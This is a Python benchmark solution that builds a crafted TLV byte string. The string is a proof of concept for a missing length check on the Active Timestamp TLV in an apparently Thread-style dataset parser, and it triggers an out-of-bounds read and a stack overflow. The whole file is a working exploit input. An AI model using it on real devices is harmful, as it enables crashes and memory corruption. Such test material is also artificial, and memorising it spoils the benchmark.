class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a missing minimum length check for certain TLVs in a
        dataset. Specifically, the Active Timestamp TLV (type 0x0E) requires a
        value of at least 10 bytes, but the vulnerable code does not enforce this.

        This PoC constructs a dataset with a malformed Active Timestamp TLV. We
        provide a length of 1 instead of 10. When the vulnerable application
        parses this TLV, it attempts to read 10 bytes from the value field,
        resulting in an out-of-bounds read from the input buffer. This corrupts
        internal state, which later leads to a stack buffer overflow when the
        application tries to process or serialize the corrupted dataset.

        To ensure the PoC is processed by the application, we include other
        structurally valid TLVs (like Network Key, PSKc, PAN ID, etc.) to form
        a plausible dataset. This allows the execution to reach the vulnerable
        code path that operates on the corrupted data. The resulting PoC is
        significantly shorter than the fuzzer-generated one, aiming for a
        higher score.
        """

        # A TLV is structured as: Type (1 byte), Length (1 byte), Value (n bytes).

        # Start with the malicious TLV.
        # Type 0x0E: Active Timestamp. Expected length: 10. Provided length: 1.
        poc = b'\x0e\x01\x00'

        # Append other common TLVs to make the dataset valid enough for processing.
        # The actual values are mostly irrelevant, but their structure is correct.

        # Network Key (Type 0x05, Length 16)
        poc += b'\x05\x10' + b'\x00' * 16

        # PSKc (Type 0x04, Length 16). The crash involves a write of size 16.
        poc += b'\x04\x10' + b'\x01' * 16

        # PAN ID (Type 0x01, Length 2)
        poc += b'\x01\x02\xde\xad'

        # Extended PAN ID (Type 0x02, Length 8)
        poc += b'\x02\x08' + b'\x02' * 8

        # Network Name (Type 0x03, Length 4)
        poc += b'\x03\x04' + b'poc_'

        # Channel (Type 0x00, Length 2)
        poc += b'\x00\x02\x00\x0b'

        return poc
